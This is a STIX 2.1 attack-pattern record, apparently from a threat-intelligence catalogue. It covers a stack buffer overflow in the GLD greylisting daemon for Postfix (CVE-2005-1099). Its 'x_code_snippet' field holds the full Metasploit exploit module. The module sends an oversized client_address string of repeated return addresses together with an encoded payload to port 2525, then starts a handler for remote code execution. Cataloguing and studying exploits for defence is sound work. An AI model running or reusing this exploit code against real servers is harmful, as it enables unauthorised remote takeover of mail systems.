{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fce06a45-081f-4130-bcce-33491f9473f4",
    "created": "2024-08-14T16:57:25.257168Z",
    "modified": "2024-08-14T16:57:25.257172Z",
    "name": "GLD (Greylisting Daemon) Postfix Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Salim Gasmi GLD <= 1.4 greylisting daemon for Postfix. By sending an overly long string the stack can be overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/gld_postfix.rb",
            "external_id": "gld_postfix.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1099"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'GLD (Greylisting Daemon) Postfix Buffer Overflow',\n      'Description'\t=> %q{\n        This module exploits a stack buffer overflow in the Salim Gasmi\n        GLD <= 1.4 greylisting daemon for Postfix. By sending an\n        overly long string the stack can be overwritten.\n      },\n      'Author'\t=> [ 'aushack' ],\n      'Arch'\t\t=> ARCH_X86,\n      'Platform'\t=> 'linux',\n      'References'\t=>\n        [\n          [ 'CVE', '2005-1099' ],\n          [ 'OSVDB', '15492' ],\n          [ 'BID', '13129' ],\n          [ 'EDB', '934' ]\n        ],\n      'Privileged'\t=> true,\n      'License'\t=> MSF_LICENSE,\n      'Payload'\t=>\n        {\n          'Space' => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20=\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'\t=>\n        [\n          [ 'RedHat Linux 7.0 (Guinness)', { 'Ret' => 0xbfffa5d8 } ],\n        ],\n      'DefaultTarget'\t=> 0,\n      'DisclosureDate'  => '2005-04-12'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(2525)\n      ],\n      self.class\n    )\n  end\n\n  def exploit\n    connect\n\n    sploit = \"sender=\"+ payload.encoded + \"\\r\\n\"\n    sploit << \"client_address=\" + [target['Ret']].pack('V') * 300 + \"\\r\\n\\r\\n\"\n\n    sock.put(sploit)\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-04-12",
    "x_mitre_platforms": [
        "linux'"
    ]
}